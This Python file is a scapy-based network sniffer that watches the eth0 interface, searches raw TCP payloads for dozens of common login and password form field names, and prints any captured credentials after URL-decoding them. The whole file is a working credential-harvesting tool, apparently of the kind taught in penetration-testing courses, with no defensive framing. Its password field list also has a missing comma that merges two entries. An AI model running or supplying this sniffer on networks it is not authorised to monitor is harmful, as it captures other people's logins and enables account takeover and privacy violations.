from scapy.all import *
from urllib import parse
import re

iface = "eth0"

def get_login_pass(body):

    user = None
    passwd = None

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)		#search for login in body
        if login_re:
            user = login_re.group()	#results we got from the re.search() function aboce
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)	#search for passfiled in body
        if pass_re:
            passwd = pass_re.group() 	#results we got from the re.search() function above

    if user and passwd:
        return(user,passwd)


def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP): 	#checks if packet has TCP layer and Raw is a sublayer of TCP and IP layer
        body = str(packet[TCP].payload)
        user_pass = get_login_pass(body)
        if user_pass != None:
            print(packet[TCP].payload)
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
          pass



try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Exiting')
    exit(0)
